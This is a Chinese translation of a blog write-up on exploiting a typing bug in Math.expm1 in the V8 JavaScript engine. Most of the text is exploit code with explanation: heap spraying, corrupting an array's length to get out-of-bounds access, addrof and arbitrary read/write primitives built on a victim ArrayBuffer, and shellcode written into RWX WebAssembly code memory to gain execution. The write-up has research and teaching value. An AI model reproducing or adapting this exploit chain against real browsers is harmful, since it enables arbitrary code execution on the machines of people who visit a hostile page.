V8的堆是由一个bump分配器和一个分代垃圾收集器管理的(简单介绍, 例如,[here](https://v8.dev/blog/orinoco-parallel-scavenger)). 作为一个bump分配器，对象在内存中的顺序遵循分配的顺序，只要GC不移动太多的东西，所以它应该只是按照顺序分配对象。为了提高可靠性，将在堆上喷洒大量对象，并保持对这些对象的引用，以防止GC收集它们。这应该有助于线性化堆。

事实上，这种spray也是利用bug的一种副作用。必须在原点数组之后分配OOB数组和受害者，但在访问原点数组之前破坏OOB数组的长度。因此，分配必须是欺骗类型的函数的一部分(前面例子中的foo)。这将在循环中被多次调用，以强制JIT编译，因此将得到大量的分配。尝试使用一个标志来只分配在最后一次调用(-0)，但这搞砸了优化，无论如何想要一个spray。

这是我们的原语的完整计划:

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/math-expm1-v85.png)

使用输入错误通过原始OOB破坏了OOB数组的长度。在那之后，就可以自由了: OOB数组现在可以让我们在任何需要的时候对其他对象进行OOB访问。这种构造只利用了一次bug，这是可取的，因为围绕它编写代码并不容易。OOB数组将是唯一长度为2的数组，它允许通过使用原始OOB在内存中扫描值2来动态地找到它的位置。这比使用固定偏移量更可靠，并且可以容忍堆布局的一些变化。注意，长度2在JSArray和FixedArray中都存在，但感兴趣的是查找和破坏JSArray的长度。OOB数组(0.4和0.5)的元素将作为标记来区分JSArray和支持的FixedArray。

一旦OOB数组被损坏，通过OOB对受害者对象构建addrof，并通过OOB对受害者缓冲区进行任意读/写，方法是更改其指向所需地址的反向指针。对象中有标记: 在受害者对象中有一个值为0x41414141的内联属性，在受害者缓冲区中有一个大小为0x41的属性。通过这种方式，可以通过从OOB数组读取这些标记来扫描内存来定位它们。

实现这个。将使用三个全局数组(arrs、obs和bufs)来存储喷洒的实例。为了处理64位整数，将使用实用程序[this exploit](https://gist.github.com/saelo/52985fe415ca576c94fc3f1975dbe837) by Samuel Groß.

函数照常启动，通过触发输入错误:

``` bash
let o = {mz: -0};
let b = Object.is(Math.expm1(x), o.mz);
```

然后分配对象，并将它们保存到全局数组中:

``` bash
let a = [0.1, 0.2, 0.3, 0.4]; // origin array
arrs.push([0.4, 0.5]); // OOB array
objs.push({marker: 0x41414141, obj: {}}); // victim object
bufs.push(new ArrayBuffer(0x41)); // victim buffer
```

现在可以搜索OOB数组，破坏JSArray的长度，这样就完成了:

``` bash
let new_size = (new Int64("7fffffff00000000")).asDouble()
for (let i = 4; i < 20; i++) {
    let val = a[b*i];
    let is_backing = a[b*(i+1)] === 0.4;
    let orig_size = Int64.fromDouble(val).toString();
    let good = (orig_size === "0x0000000200000000" && !is_backing);
    a[b*i*good] = new_size;
    if (good)
        break;
}
```

仔细看看这个。正如前面所说的，不能让它只在最后的-0调用时使用一个标记来破坏，所以它的结构在优化循环期间是无害的。然而，这将浪费循环，所以将循环迭代降低到10k(仍然足够优化)，以防止它变得太慢。

从第一个OOB索引(4)迭代到某个任意的限制(20)。当在当前索引处找到JSArray的长度时，布尔值good将为true。首先，检查当前索引处的值是否为2。由于对齐和字大小的差异，长度左移了32位。值2可以出现在两个地方: JSArray长度和相应的FixedArray长度。对JSArray感兴趣。知道FixedArray的长度后面跟着第一个元素(0.4)，所以通过查看下一个索引，可以确定是找到了JSArray还是FixedArray支持。最后，有两件事会发生a[b*i*good] = new_size:

 - 如果在优化循环中(b为false)或者没有查看JSArray的长度(good为false)，它将赋值给[0]，这是无害的;

 - 如果查看JSArray的长度，它将被设置为一个较大的值 (0x7fffffff).

一旦从-0调用返回，将(希望)在arrs中有一个长度损坏的数组，并且可以找到它:

``` bash
let oob_arr = null;
for (let i = 0; i < arrs.length; i++) {
    if (arrs[i].length !== 2) {
        oob_arr = arrs[i];
        break;
    }
}
```

现在是时候使用OOB数组来查找受害者对象，以及它的obj属性所在的OOB数组中的索引了。这是一个两步的过程。首先，寻找0x41414141标记属性，并将其更改为一个不同的值(0x42424242)。下一个索引是obj属性。

``` bash
let victim_obj = null;
let victim_obj_idx_obj = null;
for (let i = 0; i < 100; i++) {
    let val = Int64.fromDouble(oob_arr[i]).toString();
    if (val === "0x4141414100000000") {
        oob_arr[i] = (new Int64("4242424200000000")).asDouble();
        victim_obj_idx_obj = i + 1;
        break;
    }
}
```

由于有不同的标记，可以在obs中找到受害者对象(通过oob_arr的obj索引是受害者obj_obj_idx_obj):

``` bash
for (let i = 0; i < objs.length; i++) {
    if (objs[i].marker == 0x42424242) {
        victim_obj = objs[i];
        break;
    }
}
```

同样的两步过程也适用于寻找受害者缓冲区。这一次，寻找0x41长度，并将其更改为不同的大尺寸以进行标记(并不需要它那么大，但也没有什么坏处)。后备存储指针紧接在长度之后。

``` bash
let victim_buf = null;
let victim_buf_idx_ptr = null;
for (let i = 0; i < 100; i++) {
    let val = Int64.fromDouble(oob_arr[i]).toString();
    if (val === "0x0000000000000041") {
        oob_arr[i] = (new Int64("7fffffff")).asDouble();
        victim_buf_idx_ptr = i + 1;
        break;
    }
}
```

然后通过检查长度找到标记的受害者缓冲区:

``` bash
for (let i = 0; i < bufs.length; i++) {
    if (bufs[i].byteLength !== 0x41) {
        victim_buf = bufs[i];
        break;
    }
}
```

此时，已经拥有了构建原语所需的一切。例如，这是addrof:

``` bash
addrof(obj) {
    victim_obj.obj = obj;
    return Int64.fromDouble(oob_arr[victim_obj_idx_obj]);
}
```

它将对象引用赋值给受害者对象的obj字段，然后通过OOB数组读取指针。注意，V8中的指针是被标记的，以区别于小整数: 最低位总是被设置的，所以减去1就得到真正的地址。

这是任意的读/写:

``` bash
read(addr, size) {
    oob_arr[victim_buf_idx_ptr] = addr.asDouble();
    let a = new Uint8Array(victim_buf, 0, size);
    return Array.from(a);
},
write(addr, bytes) {
    oob_arr[victim_buf_idx_ptr] = addr.asDouble();
    let a = new Uint8Array(victim_buf);
    a.set(bytes);
}
```

这两种方法的第一行都使用OOB数组来更改受害者缓冲区的后备存储指针。然后，他们在ArrayBuffer的顶部创建一个Uint8Array以字节形式访问内存，并执行读/写操作。

在读写之外，还可以很容易地编写其他专用的原语，以方便使用, 把这个问题留给读者来解决。对于稍后将使用的代码执行漏洞，建议实现read32(读取32位整数)、read64(读取64位Int64)和write64(写入64位Int64)。

我们的原语现在已经实现并且稳定了。开始执行代码。

#### 代码执行

显然，NX是启用的，所以不能在 “普通” 内存区域做代码注入。从前，V8的JIT代码页拥有RWX权限。因此，可以简单地结合addrof和read来获取编译函数的代码地址，通过write用shellcode覆盖它，然后调用该函数。不幸的是，现在已经不是这样了[compilation flag](https://cs.chromium.org/chromium/src/v8/src/flag-definitions.h?rcl=dde25872f58951bb0148cf43d6a504ab2f280485&l=717)默认情况下，它将通过在RW和RX之间交替编写保护代码。

顺便说一句，这个标志实际上可以在运行时更改(有一个可写的副本)。能做到吗? 简短的回答: 不要浪费时间，有更好的方法(见下文)。长答案(需要V8内部知识): 标志缓存在堆实例中，可以通过MemoryChunk定位，可以通过从堆对象逐页向后扫描来找到有效的头。然而，更改标志将改变CodeSpaceMemoryModificationScope的语义，并且编译器试图写入RX内存时可能会崩溃。我想，如果让它分配一个新的MemoryChunk(可能通过使用大型代码对象空间?)，它可能会工作，但还必须担心后台编译和反优化, 在我看来很乱。

显然，唯一的选择是代码重用攻击(例如，ROP)。这将需要一个堆栈枢轴，或者找到一个合适的堆栈帧来损坏。我很懒，我喜欢更好的方式。幸运的是，JavaScript并不是V8中唯一需要编译的语言: 还有WebAssembly.[write-protect flag](https://cs.chromium.org/chromium/src/v8/src/flag-definitions.h?rcl=dde25872f58951bb0148cf43d6a504ab2f280485&l=543) 默认为false，因此编译后的WebAssembly代码为RWX。

可以编译一些WebAssembly代码，并通过addrof获得导出函数的JSFunction对象的地址:

``` bash
let wasm_code = new Uint8Array([...]);
let wasm_mod = new WebAssembly.Instance(new WebAssembly.Module(wasm_code), {});
let f = wasm_mod.exports.function_name;
let f_addr = prims.addrof(f);
```

现在，必须从这个JSFunction中获取编译后代码的地址。通过查看JS-to-Wasm包装器是如何内置的，可以找到答案[wasm-compiler.cc](https://cs.chromium.org/chromium/src/v8/src/compiler/wasm-compiler.cc?rcl=dde25872f58951bb0148cf43d6a504ab2f280485&l=4839) (并经过一些调试)。从JSFunction中，必须读取SharedFunctionInfo指针。然后，从共享的信息中，可以得到一个指向函数data的指针，它的类型是wasmexporttedfunctiondata。这里有需要的两个字段: 指向WasmInstanceObject的指针和函数索引。从WasmInstanceObject中，可以获得跳转表起始点的地址，当将该地址添加到函数索引时，将给出函数跳转表项的地址。它位于RWX代码内存中，是函数的入口点。将保留计算偏移量和将读取链写入阅读器(必须查看一些标题，这并不困难)。

一旦有了入口点地址，可以向它编写shellcode并调用该函数:

``` bash
let shellcode = [0xcc, 0x48, 0xc7, 0xc0, 0x37, 0x13, 0x00, 0x00];
prims.write(code_addr, shellcode);
f();
```

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/math-expm1-v86.png)

完美的结局.

#### Conclusion

这是我触发过的最严重的漏洞。这个漏洞本身是相当标准的 (关于最后一部分，我以前没有见过公开使用WebAssembly，但我相信其他人知道它)，但是愚弄typer绝对是一次冒险。离开的时候，对V8的内部结构有了一定的了解，虽然仍然有限，但已经比刚开始的时候好多了。希望您喜欢阅读这篇文章，尽管它相当长。一次又一次,[@_tsuro](https://twitter.com/_tsuro)对于第一次发现并利用这个bug: 这是一项可怕的工作!

#### 译自

 - [Exploiting the Math.expm1 typing bug in V8](https://abiondo.me/2019/01/02/exploiting-math-expm1-v8/#javascript-exploitation-primitives)
<!-- kb:end Exploiting-the-Math-expm1-typing-bug-in-V8 -->

</details>

